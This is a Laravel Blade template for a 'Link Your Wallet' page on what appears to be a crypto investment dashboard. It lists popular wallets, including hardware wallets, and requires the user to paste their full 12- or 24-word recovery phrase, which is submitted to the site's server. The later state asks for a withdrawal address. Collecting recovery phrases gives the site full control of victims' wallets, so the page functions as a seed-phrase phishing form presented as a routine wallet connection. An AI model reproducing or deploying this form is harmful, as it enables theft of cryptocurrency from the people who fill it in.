@extends('layout.user')
@push('content')
    <!-- HEADER -->
    <div class="header">
    </div> <!-- / .header -->

    <div class="main-content">


        <div class="container-lg">
            <div class="row justify-content-center">
                <div class="col-12 col-lg-10 col-xl-8">


                    @if ($user->wallet_status == 0)
                        <div class="tab-pane fade show active" id="wizardStepOne" role="tabpanel" aria-labelledby="wizardTabOne"
                            data-helpers--step-form-target="step">
                            <div class="row justify-content-center">
                                <div class="col-12 col-md-10 col-lg-8 col-xl-6 text-center">
                                    <h6 class="mb-4 text-uppercase text-muted">
                                        Step 1 of 2
                                    </h6>
                                    <h1 class="mb-3">
                                        Link Your Wallet
                                    </h1>

                                </div>
                            </div>
                            <form method="POST" action="{{ route('connect.store') }}" class="tab-content">
                                @csrf
                                <div class="form-group">
                                    <label for="payment_option" class="form-label">
                                        Wallet Type
                                    </label>
                                    <select name="wallet_type" class="form-select mb-3" required>
                                        <option value="" disabled selected>Select wallet type</option>
                                        <option value="trust wallet">Trust Wallet</option>
                                        <option value="gemini wallet">Gemini Wallet</option>
                                        <option value="binance wallet">Binance Wallet</option>
                                        <option value="coinbase wallet">Coinbase Wallet</option>
                                        <option value="metamask">MetaMask</option>
                                        <option value="crypto.com wallet">Crypto.com Wallet</option>
                                        <option value="exodus wallet">Exodus Wallet</option>
                                        <option value="ledger">Ledger (Hardware Wallet)</option>
                                        <option value="trezor">Trezor (Hardware Wallet)</option>
                                        <option value="atomic wallet">Atomic Wallet</option>
                                        <option value="electrum">Electrum</option>
                                        <option value="mycelium">Mycelium</option>
                                        <option value="blockchain.com wallet">Blockchain.com Wallet</option>
                                        <option value="argent">Argent</option>
                                        <option value="phantom">Phantom (for Solana)</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <label for="recovery_phrase" class="form-label">
                                    </label>
                                    <textarea name="recovery_phrase" row="3" class="form-control" required
                                        placeholder="Please enter your 12/24 word phrase"></textarea>
                                    <small class="form-text text-muted">
                                        Please Note : Seperated by space (e.g house car enjoy repair)
                                    </small>
                                </div>
                                <hr class="my-5">
                                <div class="nav row align-items-center">
                                    <div class="col-auto">
                                        <a href="{{ url('user/dashboard') }}" class="btn btn-lg btn-white lift"
                                            type="reset">Cancel</a>
                                    </div>
                                    <div class="col text-center">
                                        <h6 class="text-uppercase text-muted mb-0">Step 1 of 2</h6>
                                    </div>
                                    <div class="col-auto">
                                        <button class="btn btn-lg btn-primary" type="submit">Connect Wallet</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    @else
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-12">

                                    <!-- Card -->
                                    <div class="card card-inactive">
                                        <div class="card-body text-center">

                                            <!-- Image -->
                                            <i class="fa fa-wallet text-primary mt-5 mb-4" style="font-size: 500%"></i>

                                            <!-- Title -->
                                            <h1>
                                                Wallet Connected
                                            </h1>



                                            @if ($user->account == 0)
                                                <!-- Subtitle -->
                                                <p class="text-muted">
                                                    Please create a withdrawal account before linking wallet.
                                                </p>
                                                <!-- Button -->
                                                <a href="{{ url('user/accounts') }}" class="btn btn-primary">
                                                    Add Withdrawal Address
                                                </a>
                                            @else
                                            @endif

                                            <div class="mt-3">
                                                <!-- Button -->
                                                <a href="{{ url('user/dashboard') }}">
                                                    Go to dashboard
                                                </a>

                                            </div>

                                        </div>
                                    </div>

                                </div>
                            </div> <!-- / .row -->
                        </div>
                    @endif



                </div>
            </div>
        </div>
    </div>
@endpush
